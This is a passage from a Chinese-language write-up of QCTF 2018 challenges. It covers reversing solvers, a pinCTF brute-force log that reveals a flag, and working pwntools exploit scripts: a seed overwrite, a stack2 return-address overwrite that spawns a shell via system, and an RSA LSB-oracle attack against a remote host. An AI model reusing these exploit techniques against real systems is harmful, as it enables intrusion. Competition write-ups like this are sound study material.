&#39;\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&#39;flag = &#39;&#39;for i in range(5):    ch = ord(enc1[i]) ^ (32 - i)    print &#39;index&#39;, i, &#39;==&gt;&#39;, chr(ch)    flag += chr(ch)for i in range(5, 32):    for ch in range(256):        t = ch ^ (32 - i)        if i % 2 == 0:            res = ((t &lt;&lt; 2) &amp; 0xff) | (t &gt;&gt; 6)        else:            res = (t &gt;&gt; 2) | ((t &lt;&lt; 6) &amp; 0xff)        if res == ord(enc2[i - 5]):            print &#39;index&#39;, i, &#39;==&gt;&#39;, chr(ch)            flag += chr(ch)            breakprint len(flag)print &#39;flag:&#39;, flag</code></pre><p>最后放上官方给出的源码：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;string.h&gt;char *check1=&quot;Q|j{g&quot;;char *check2= &quot;\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&quot;;void check(char *s){    int i;    for(i=5;i&lt;strlen(s);i++){        if(i%2)            s[i]=(s[i]&gt;&gt;2)|((s[i]&lt;&lt;6)&amp;0xff);        else            s[i]=((s[i]&lt;&lt;2)&amp;0xff)|(s[i]&gt;&gt;6);    }    if(!strncmp(&amp;s[5],check2,27))        printf(&quot;Right!\n&quot;);    else        printf(&quot;Wrong!\n&quot;);}void main(){    char s[33];    int i;    printf(&quot;Give me your flag:&quot;);    scanf(&quot;%32s&quot;,s);    for(i=0;i&lt;32;i++)        s[i]^=(32-i);    if(!strncmp(s,check1,5))        check(s);    else        printf(&quot;Wrong\n&quot;);}</code></pre><h2 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h2><p>总共给了三个文件，<code>asong</code> 为可执行文件，<code>that_girl</code> 以及 <code>out</code> 都是 ascii 文本。将 <code>asong</code> 拖进 ida 后，看到 main 函数的样子：</p><pre><code class="cpp">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  void *girl; // ST00_8  char *input; // ST08_8  girl = malloc(0xBCuLL);  input = (char *)malloc(0x50uLL);  init_func();  getline(input);  simple_check(input);  cal(&quot;that_girl&quot;, (__int64)girl);  encrypt(input, (__int64)girl);  return 0LL;}</code></pre><p>第一个 <code>init_func()</code>，设置一下缓冲区：</p><pre><code class="cpp">void init_func(){  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);}</code></pre><p><code>getline()</code> 函数实现了一个简单的读取一行的功能：</p><pre><code class="cpp">char __fastcall getline(char *a1){  char *v1; // rax  signed int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  {    LOBYTE(v1) = read(0, &amp;a1[i], 1uLL) == 1;    if ( !(_BYTE)v1 )      break;    if ( a1[i] == 10 || i &gt; 100 )    {      v1 = &amp;a1[i];      *v1 = 0;      return (char)v1;    }  }  return (char)v1;}</code></pre><p><code>simple_check()</code> 函数检查读入字符串中是否以 <code>&#39;QCTF{&#39;</code> 开头，以及是否以 <code>&#39;}&#39;</code> 结尾：</p><pre><code class="cpp">void __fastcall simple_check(char *a1){  int v1; // [rsp+14h] [rbp-Ch]  void *dest; // [rsp+18h] [rbp-8h]  dest = malloc(0x50uLL);  if ( memcmp(a1, &quot;QCTF{&quot;, 5uLL) )    exit(-1);  memcpy(dest, a1 + 5, 0x4BuLL);  v1 = strlen((const char *)dest);  if ( *((_BYTE *)dest + v1 - 1) == &#39;}&#39; )    *((_BYTE *)dest + v1 - 1) = 0;  memcpy(a1, dest, 0x50uLL);  free(dest);}</code></pre><p><code>cal()</code> 函数读取了文件 <code>that_girl</code> 的内容，应该是通过 <code>convert()</code> 函数对其中的每个字符做了一个词频的统计：</p><pre><code class="cpp">int __fastcall cal(const char *that_girl, __int64 girl){  int v2; // eax  char *v4; // [rsp+0h] [rbp-20h]  char buf; // [rsp+13h] [rbp-Dh]  int fd; // [rsp+14h] [rbp-Ch]  unsigned __int64 v7; // [rsp+18h] [rbp-8h]  v7 = __readfsqword(0x28u);  fd = open(that_girl, 0, girl, that_girl);  while ( read(fd, &amp;buf, 1uLL) == 1 )  {    v2 = convert(buf);    ++*(_DWORD *)&amp;v4[4 * v2];  }  return close(fd);}</code></pre><p><code>convert()</code> 函数中是一个对读入的 buf 的映射，不用刻意看具体是什么操作，后面直接打表就完事了：</p><pre><code class="cpp">__int64 __fastcall convert(char buf){  __int64 result; // rax  result = (unsigned int)(buf - 10);  switch ( buf )  {    case &#39;\n&#39;:      result = (unsigned int)(buf + 35);      break;    case &#39; &#39;:    case &#39;!&#39;:    case &#39;&quot;&#39;:      result = (unsigned int)(buf + 10);      break;    case &#39;\&#39;&#39;:      result = (unsigned int)(buf + 2);      break;    case &#39;,&#39;:      result = (unsigned int)(buf - 4);      break;    case &#39;.&#39;:      result = (unsigned int)(buf - 7);      break;    case &#39;:&#39;:    case &#39;;&#39;:      result = (unsigned int)(buf - 21);      break;    case &#39;?&#39;:      result = (unsigned int)(buf - 27);      break;    case &#39;_&#39;:      result = (unsigned int)(buf - 49);      break;    default:      if ( buf &lt;= &#39;/&#39; || buf &gt; &#39;9&#39; )      {        if ( buf &lt;= &#39;@&#39; || buf &gt; &#39;Z&#39; )        {          if ( buf &gt; &#39;`&#39; &amp;&amp; buf &lt;= &#39;z&#39; )            result = (unsigned int)(buf - 87);  // lower case        }        else        {          result = (unsigned int)(buf - 55);    // upper case        }      }      else      {        result = (unsigned int)(buf - 48);      // number      }      break;  }  return result;}</code></pre><p>最后是对 flag 的加密部分：</p><pre><code class="cpp">unsigned __int64 __fastcall encrypt(const char *input, char *girl){  int i; // [rsp+18h] [rbp-48h]  int len; // [rsp+1Ch] [rbp-44h]  char enc[56]; // [rsp+20h] [rbp-40h]  unsigned __int64 v6; // [rsp+58h] [rbp-8h]  v6 = __readfsqword(0x28u);  len = strlen(input);  for ( i = 0; i &lt; len; ++i )    enc[i] = *(_DWORD *)&amp;girl[4 * (signed int)convert(input[i])];  index_round(enc);  shift(enc, len);  output(enc, &quot;out&quot;, len);  return __readfsqword(0x28u) ^ v6;}</code></pre><p>这里用到了一个 global 的 table，和之前的词频一样，通过打表将映射关系记录下来：</p><pre><code class="c">__int64 __fastcall index_round(char *enc){  __int64 result; // rax  _BYTE v2[5]; // [rsp+13h] [rbp-5h]  v2[4] = 0;                                    // v2[1] = 0;  *(_DWORD *)v2 = (unsigned __int8)*enc;  while ( table[*(signed int *)&amp;v2[1]] )  {    enc[*(signed int *)&amp;v2[1]] = enc[table[*(signed int *)&amp;v2[1]]];    *(_DWORD *)&amp;v2[1] = table[*(signed int *)&amp;v2[1]];  }  result = v2[0];  enc[*(signed int *)&amp;v2[1]] = v2[0];  return result;}</code></pre><p><code>shift()</code> 做了一个循环位移，这个操作显然是可逆的：</p><pre><code class="cpp">char *__fastcall shift(char *enc, int len){  char *result; // rax  char v3; // [rsp+17h] [rbp-5h]  int i; // [rsp+18h] [rbp-4h]  v3 = (unsigned __int8)*enc &gt;&gt; 5;  for ( i = 0; len - 1 &gt; i; ++i )    enc[i] = 8 * enc[i] | ((unsigned __int8)enc[i + 1] &gt;&gt; 5);  result = &amp;enc[i];  *result = 8 * *result | v3;  return result;}</code></pre><p><code>output()</code> 函数将密文输出到 <code>out</code> 中：</p><pre><code class="cpp">int __fastcall output(char *enc, const char *file, int len){  int v4; // [rsp+Ch] [rbp-24h]  int i; // [rsp+28h] [rbp-8h]  int fd; // [rsp+2Ch] [rbp-4h]  v4 = len;  fd = open(file, 65, 438LL);  for ( i = 0; i &lt; v4; ++i )    write(fd, &amp;enc[i], 1uLL);  return close(fd);}</code></pre><p>总体加密过程统计了 that_girl 文件的词频, 并将 flag 转换为对应的词频。经过两次加密, 置换, 移位。最后在尝试中写出最后的脚本：</p><pre><code class="python">#!/usr/bin/env pythonf = open(&#39;out&#39;, &#39;rb&#39;)t = f.read()f.close()enc = []for i in range(len(t)):    enc.append(ord(t[i]))print encflag = &#39;&#39;def convert(c):    res = c - 10    if c == 10:        res = c + 35    elif 32 &lt;= c &lt;= 34:        res = c + 10    elif c == 39:        res = c + 2    elif c == 44:        res = c - 4    elif c == 46:        res = c - 7    elif 58 &lt;= c &lt;= 59:        res = c - 21    elif c == 63:        res = c - 27    elif c == 95:        res = c - 49    else:        if c &lt;= 47 or c &gt; 57:            if c &lt;= 64 or c &gt; 90:                if c &gt; 96 and c &lt;= 122:                    res = c - 87            else:                res = c - 55        else:            res = c - 48    return res# convert1convert_map = {}for ch in range(256):    convert_map[convert(ch)] = ch# print convert_mapf = open(&#39;that_girl&#39;, &#39;rb&#39;)that_girl = f.read()f.close()# print that_girlgirl = [0 for i in range(256)]for i in range(len(that_girl)):    t = convert(that_girl[i])    girl[t * 4] += 1# print girl# shiftenc1 = []enc1.append(((enc[-1] &lt;&lt; 5) &amp; 0xff) | (enc[0] &gt;&gt; 3))for i in range(len(enc) - 1):    enc1.append(((enc[i] &lt;&lt; 5) &amp; 0xff) | (enc[i + 1] &gt;&gt; 3))print len(enc1)table = [0x00000016, 0x00000000, 0x00000006, 0x00000002, 0x0000001E, 0x00000018, 0x00000009, 0x00000001, 0x00000015, 0x00000007, 0x00000012, 0x0000000A, 0x00000008, 0x0000000C, 0x00000011, 0x00000017, 0x0000000D, 0x00000004, 0x00000003, 0x0000000E, 0x00000013, 0x0000000B, 0x00000014, 0x00000010, 0x0000000F, 0x00000005, 0x00000019, 0x00000024, 0x0000001B, 0x0000001C, 0x0000001D, 0x00000025, 0x0000001F, 0x00000020, 0x00000021, 0x0000001A, 0x00000022, 0x00000023]print len(table)# convert2round_map = {}x = 0while table[x] != 0:    round_map[table[x]] = x    x = table[x]round_map[0] = 1print round_mapenc2 = [0 for i in range(len(enc1))]for origin, encoded in round_map.items():    enc2[origin] = enc1[encoded]for i in range(len(enc2)):    for j in range(len(girl) / 4):        if enc2[i] == girl[j * 4]:            flag += chr(convert_map[j])            breakprint &#39;flag: QCTF{%s}&#39; % flag</code></pre><h2 id="ollvm"><a href="#ollvm" class="headerlink" title="ollvm"></a>ollvm</h2><p>题目给的 binary 很大，各种混淆，硬逆太困难了。<code>pintool</code> 走一波，这里推荐一个脚本 <a href="https://github.com/ChrisTheCoolHut/PinCTF" target="_blank" rel="noopener">pinCTF</a>（大概跑了一个半小时的样子）。</p><pre><code class="bash">root@fea7928d5398:~/PinCTF# ./pinCTF.py -f ./ollvm -a -l obj-intel64/ -sl 38 -r abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_+={} -sk[~] Status:threading : FalsereverseRange : FalseskipFavoredPaths : True[~] Trying {AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 0 using Q for QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying Q{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 1 using C for QCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QC{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 2 using T for QCTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCT{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 3 using F for QCTFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 4 using { for QCTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 5 using 5 for QCTF{5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 6 using Y for QCTF{5YAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Y{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 7 using m for QCTF{5YmAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym{AAAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 8 using 4 for QCTF{5Ym4AAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4{AAAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 9 using a for QCTF{5Ym4aAAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4a{AAAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 10 using O for QCTF{5Ym4aOAAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aO{AAAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 11 using E for QCTF{5Ym4aOEAAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOE{AAAAAAAAAAAAAAAAAAAAAAAAA[+] iter 12 using w for QCTF{5Ym4aOEwAAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEw{AAAAAAAAAAAAAAAAAAAAAAAA[+] iter 13 using w for QCTF{5Ym4aOEwwAAAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww{AAAAAAAAAAAAAAAAAAAAAAA[+] iter 14 using 2 for QCTF{5Ym4aOEww2AAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2{AAAAAAAAAAAAAAAAAAAAAA[+] iter 15 using N for QCTF{5Ym4aOEww2NAAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2N{AAAAAAAAAAAAAAAAAAAAA[+] iter 16 using c for QCTF{5Ym4aOEww2NcAAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2Nc{AAAAAAAAAAAAAAAAAAAA[+] iter 17 using Z for QCTF{5Ym4aOEww2NcZAAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZ{AAAAAAAAAAAAAAAAAAA[+] iter 18 using c for QCTF{5Ym4aOEww2NcZcAAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZc{AAAAAAAAAAAAAAAAAA[+] iter 19 using v for QCTF{5Ym4aOEww2NcZcvAAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcv{AAAAAAAAAAAAAAAAA[+] iter 20 using U for QCTF{5Ym4aOEww2NcZcvUAAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvU{AAAAAAAAAAAAAAAA[+] iter 21 using P for QCTF{5Ym4aOEww2NcZcvUPAAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUP{AAAAAAAAAAAAAAA[+] iter 22 using O for QCTF{5Ym4aOEww2NcZcvUPOAAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPO{AAAAAAAAAAAAAA[+] iter 23 using W for QCTF{5Ym4aOEww2NcZcvUPOWAAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOW{AAAAAAAAAAAAA[+] iter 24 using K for QCTF{5Ym4aOEww2NcZcvUPOWKAAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWK{AAAAAAAAAAAA[+] iter 25 using Y for QCTF{5Ym4aOEww2NcZcvUPOWKYAAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKY{AAAAAAAAAAA[+] iter 26 using M for QCTF{5Ym4aOEww2NcZcvUPOWKYMAAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYM{AAAAAAAAAA[+] iter 27 using n for QCTF{5Ym4aOEww2NcZcvUPOWKYMnAAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMn{AAAAAAAAA[+] iter 28 using P for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPAAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnP{AAAAAAAA[+] iter 29 using a for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaAAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPa{AAAAAAA[+] iter 30 using q for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqAAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaq{AAAAAA[+] iter 31 using P for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPAAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqP{AAAAA[+] iter 32 using y for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPyAAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPy{AAAA[+] iter 33 using w for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywAAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPyw{AAA[+] iter 34 using R for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywRAAA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR{AA[+] iter 35 using 2 for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2AA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2{A[+] iter 36 using m for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2mA[~] Trying QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m{[+] iter 37 using } for QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m}[+] Found pattern QCTF{5Ym4aOEww2NcZcvUPOWKYMnPaqPywR2m}</code></pre><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="Xman-dice-game"><a href="#Xman-dice-game" class="headerlink" title="Xman-dice_game"></a>Xman-dice_game</h2><p>放进 ida 看 main 函数：</p><p><img src="/pics/2018-QCTF/15.png" srcset="/img/loading.gif" alt></p><p>buf 存在溢出，可以覆盖到 seed，使之为 0。想法就是通过爆破得到随机数的顺序。脚本：</p><pre><code class="python">from pwn import *import randomimport timedef test(ans):    p = process(&#39;./dice_game&#39;)    # p = remote(&quot;47.96.239.28&quot;, 9999)    p.readuntil(&quot;name:&quot;)    payload = p64(0xabcdabcdabcdabcd) * 8 + p64(0)    p.sendline(payload)    i = 0    ans_len = len(ans)    log.success(ans)    if True:        while i &lt; ans_len:            p.readuntil(&quot;nt(1~6): &quot;)            n = ans[i]            i += 1            p.sendline(n)        random.seed(time.time())        n = str(int(random.randint(1, 6)))        p.readuntil(&quot;nt(1~6): &quot;)        p.sendline(n)        print(n)        sub = p.readuntil(&#39;.&#39;)        log.info(sub)        return sub, nans = &quot;&quot;while(1):    if len(ans) == 50:        print(ans)        break    res, n = test(ans)    if &quot;win&quot; in res:        ans += n</code></pre><p>通过得到的顺序作为 payload，脚本：</p><pre><code class="python">from pwn import *p = process(&#39;./dice_game&#39;)# p = remote(&quot;47.96.239.28&quot;, 9999)p.readuntil(&quot;name:&quot;)payload = p64(0x1122334455667788) * 8 + p64(0)p.sendline(payload)ans = &quot;25426251423232651155634433322261116425254446323361&quot;i = 0while i &lt; 50:    p.readuntil(&quot;nt(1~6): &quot;)    n = ans[i]    i += 1    p.sendline(n)p.interactive()</code></pre><p><img src="/pics/2018-QCTF/16.png" srcset="/img/loading.gif" alt></p><h2 id="Xan-stack2"><a href="#Xan-stack2" class="headerlink" title="Xan-stack2"></a>Xan-stack2</h2><p>感觉这应该算是一道比较好的栈溢出的题。<code>checksec</code> 发现 PIE 没开，Canary 和 NX 都开了。</p><p><img src="/pics/2018-QCTF/17.png" srcset="/img/loading.gif" alt></p><p>拖进 ida 后 f5：</p><pre><code class="cpp">int __cdecl main(int argc, const char **argv, const char **envp){  int v3; // eax  unsigned int v5; // [esp+18h] [ebp-90h]  unsigned int v6; // [esp+1Ch] [ebp-8Ch]  int v7; // [esp+20h] [ebp-88h]  unsigned int j; // [esp+24h] [ebp-84h]  int v9; // [esp+28h] [ebp-80h]  unsigned int i; // [esp+2Ch] [ebp-7Ch]  unsigned int k; // [esp+30h] [ebp-78h]  unsigned int l; // [esp+34h] [ebp-74h]  char v13[100]; // [esp+38h] [ebp-70h]  unsigned int v14; // [esp+9Ch] [ebp-Ch]  v14 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  v9 = 0;  puts(&quot;***********************************************************&quot;);  puts(&quot;*                      An easy calc                       *&quot;);  puts(&quot;*Give me your numbers and I will return to you an average *&quot;);  puts(&quot;*(0 &lt;= x &lt; 256)                                           *&quot;);  puts(&quot;***********************************************************&quot;);  puts(&quot;How many numbers you have:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v5);  puts(&quot;Give me your numbers&quot;);  for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i )  {    __isoc99_scanf(&quot;%d&quot;, &amp;v7);    v13[i] = v7;  }  for ( j = v5; ; printf(&quot;average is %.2lf\n&quot;, (double)((long double)v9 / (double)j)) )  {    while ( 1 )    {      while ( 1 )      {        while ( 1 )        {          puts(&quot;1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v6);          if ( v6 != 2 )            break;          puts(&quot;Give me your number&quot;);          __isoc99_scanf(&quot;%d&quot;, &amp;v7);          if ( j &lt;= 0x63 )          {            v3 = j++;            v13[v3] = v7;          }        }        if ( v6 &gt; 2 )          break;        if ( v6 != 1 )          return 0;        puts(&quot;id\t\tnumber&quot;);        for ( k = 0; k &lt; j; ++k )          printf(&quot;%d\t\t%d\n&quot;, k, v13[k]);      }      if ( v6 != 3 )        break;      puts(&quot;which number to change:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v5);      puts(&quot;new number:&quot;);      __isoc99_scanf(&quot;%d&quot;, &amp;v7);      v13[v5] = v7;    }    if ( v6 != 4 )      break;    v9 = 0;    for ( l = 0; l &lt; j; ++l )      v9 += v13[l];  }  return 0;}</code></pre><p>还能看到有一个<code>hackhere</code>函数，直接调用了<code>system(&quot;/bin/bash&quot;)</code>。</p><pre><code class="cpp">puts(&quot;which number to change:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v5);puts(&quot;new number:&quot;);__isoc99_scanf(&quot;%d&quot;, &amp;v7);v13[v5] = v7; // index out of bound</code></pre><p>这里发现 v5 和 v7 没有做任何检查，能达到任意地址写。</p><p>所以这题的思路就是将 <code>main</code> 函数 return 地址覆盖为 <code>hackhere</code> 的地址。</p><p><img src="/pics/2018-QCTF/18.png" srcset="/img/loading.gif" alt></p><p>基本就是 ret 到 hackhere 然后直接就成功了：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *import ctypesp = process(&#39;./stack2&#39;)context.log_level = &#39;debug&#39;def change(index, content):    p.sendlineafter(&#39;5. exit\n&#39;, &#39;3&#39;)    p.sendlineafter(&#39;which number to change:\n&#39;, str(index))    p.sendlineafter(&#39;new number:\n&#39;, str(content))p.sendlineafter(&#39;How many numbers you have:\n&#39;, &#39;1&#39;)p.sendlineafter(&#39;Give me your numbers\n&#39;, &#39;1&#39;)hack_addr = 0x0804859boffset = 132# gdb.attach(p, &#39;b *0x0804859b&#39;)for i in range(4):    byte = (hack_addr &gt;&gt; (i * 8)) &amp; 0xff    byte = str(ctypes.c_int8(byte))    start = byte.find(&#39;(&#39;) + 1    end = byte.find(&#39;)&#39;)    byte = int(byte[start:end])    change(offset + i, byte)p.sendlineafter(&#39;5. exit\n&#39;, &#39;5&#39;)p.interactive()</code></pre><p>但发现远程没有 bash，所以想到直接用字符串中的 sh，即 <code>system(&amp;&quot;/bin/bash&quot;[7])</code>，只需要找到字符串在栈上的位置：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *import ctypesp = process(&#39;./stack2&#39;)context.log_level = &#39;debug&#39;def change(index, content):    p.sendlineafter(&#39;5. exit\n&#39;, &#39;3&#39;)    p.sendlineafter(&#39;which number to change:\n&#39;, str(index))    p.sendlineafter(&#39;new number:\n&#39;, str(content))p.sendlineafter(&#39;How many numbers you have:\n&#39;, &#39;1&#39;)p.sendlineafter(&#39;Give me your numbers\n&#39;, &#39;1&#39;)hack_addr = 0x0804859bsys_addr = 0x08048450offset = 132# gdb.attach(p, &#39;b *0x0804859b&#39;)# overflow retfor i in range(4):    byte = (sys_addr &gt;&gt; (i * 8)) &amp; 0xff    byte = str(ctypes.c_int8(byte))    start = byte.find(&#39;(&#39;) + 1    end = byte.find(&#39;)&#39;)    byte = int(byte[start:end])    change(offset + i, byte)str_addr = 0x08048987offset2 = offset + 8# point to string &#39;sh&#39;for i in range(4):    byte = (str_addr &gt;&gt; (i * 8)) &amp; 0xff    byte = str(ctypes.c_int8(byte))    start = byte.find(&#39;(&#39;) + 1    end = byte.find(&#39;)&#39;)    byte = int(byte[start:end])    change(offset2 + i, byte)p.sendlineafter(&#39;5. exit\n&#39;, &#39;5&#39;)p.interactive()</code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>题目信息如下：</p><pre><code class="rsa">e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0</code></pre><p><a href="https://introspelliam.github.io/2018/03/27/crypto/RSA-Least-Significant-Bit-Oracle-Attack/" target="_blank" rel="noopener">最低有效位攻击</a>了解一下。</p><p>对密文乘 <code>2^e(mod n)</code> 操作，再解密的时候，如果为偶数，说明明文在 <code>(0, n/2)</code> 之间，否则在 <code>(n/2, n)</code> 之间。这样，只需要 log<sub>2</sub>n 次就可以知道明文：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *e = 0x10001n = 0x0b765daa79117afe1a77da7ff8122872bbcbddb322bb078fe0786dc40c9033fadd639adc48c3f2627fb7cb59bb0658707fe516967464439bdec2d6479fa3745f57c0a5ca255812f0884978b2a8aaeb750e0228cbe28a1e5a63bf0309b32a577eecea66f7610a9a4e720649129e9dc2115db9d4f34dc17f8b0806213c035e22f2c5054ae584b440def00afbccd458d020cae5fd1138be6507bc0b1a10da7e75def484c5fc1fcb13d11be691670cf38b487de9c4bde6c2c689be5adab08b486599b619a0790c0b2d70c9c461346966bcbae53c5007d0146fc520fa6e3106fbfc89905220778870a7119831c17f98628563ca020652d18d72203529a784ca73716dbc = 0x4f377296a19b3a25078d614e1c92ff632d3e3ded772c4445b75e468a9405de05d15c77532964120ae11f8655b68a630607df0568a7439bc694486ae50b5c0c8507e5eecdea4654eeff3e75fb8396e505a36b0af40bd5011990663a7655b91c9e6ed2d770525e4698dec9455db17db38fa4b99b53438b9e09000187949327980ca903d0eef114afc42b771657ea5458a4cb399212e943d139b7ceb6d5721f546b75cd53d65e025f4df7eb8637152ecbb6725962c7f66b714556d754f41555c691a34a798515f1e2a69c129047cb29a9eef466c206a7f4dbc2cea1a46a39ad3349a7db56c1c997dc181b1afcb76fa1bbbf118a4ab5c515e274ab2250dba1872be0upper = nlower = 0k = 1while True:    r = remote(&#39;111.198.29.45&#39;, 33136)    r.recvuntil(&#39;now\n&#39;)    pat = (pow(pow(2, k, n), e, n) * c) % n    new_c = hex(pat)[2:].strip(&#39;L&#39;)    r.sendline(new_c)    data = r.recvline()[:-1]    r.close()    gap = upper - lower    if data == &#39;even&#39;:        info(&#39;Round {}: even&#39;.format(str(k)))        upper = (upper + lower) / 2    if data == &#39;odd&#39;:        info(&#39;Round {}: odd&#39;.format(str(k)))        lower = (upper + lower) / 2    if data == &#39;error&#39;:        break    if gap &lt; 2:        break    info(gap)    k += 1flag = &#39;{:x}&#39;.format(upper).decode(&#39;hex&#39;)[:-1] + &#39;}&#39;print &#39;flag:&#39;, flag</code></pre><h2 id="Xman-RSA"><a href="#Xman-RSA" class="headerlink" title="Xman-RSA"></a>Xman-RSA</h2><p>拿到四个文件后，其中有一个很像 python 的脚本，通过对关键字等的判断，自己写脚本还原：</p><pre><code class="python">l1 = {    &#39;a&#39;: &#39;d&#39;,    &#39;b&#39;: &#39;m&#39;,    &#39;d&#39;: &#39;e&#39;,    &#39;e&#39;: 